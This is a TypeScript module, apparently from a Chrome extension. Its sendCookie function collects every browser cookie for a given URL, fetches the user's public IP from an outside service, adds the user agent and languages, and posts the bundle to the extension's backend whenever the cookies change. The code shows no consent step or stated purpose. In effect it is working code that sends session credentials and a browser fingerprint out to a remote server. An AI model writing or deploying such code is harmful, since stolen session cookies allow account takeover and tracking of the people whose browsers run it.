import hash_sum from 'hash-sum'
import { getToken } from '../api/getToken'
import { getBaseUrl } from '../api/baseUrl'

const getIP = async () => {
	const res = await fetch('https://api.ipify.org/?format=json')
	const data = await res.json()
	return data.ip
}

const sendFingerprint = async (obj: any) => {
	const token = await getToken()
	return fetch(`${await getBaseUrl()}/parser/cookies/`, {
		method: 'POST',
		headers: {
			'Content-Type': 'application/json',
			Authorization: `Bearer ${token}`,
		},
		body: JSON.stringify(obj),
	})
}

export const sendCookie = async (url: string) => {
	const cookies = await chrome.runtime.sendMessage({ action: 'get-cookie', url })
	if (!cookies) {
		return
	}

	const cookiesStr = JSON.stringify(cookies.cookies, null, 2)
	const hash = hash_sum(cookiesStr)
	const prevHash = await chrome.storage.local.get('cookiesHash')

	if (prevHash.cookiesHash !== hash) {
		const navigator: any = {
			'user-agent': window.navigator.userAgent,
			'language': window.navigator.languages
		}

		const ip = await getIP()
		sendFingerprint({
			navigator,
			cookies,
			ip
		})
			.catch((e) => {
				console.error('Error sending data to server:', e)
				}
			)
		chrome.storage.local.set({ cookiesHash: hash })
	}
}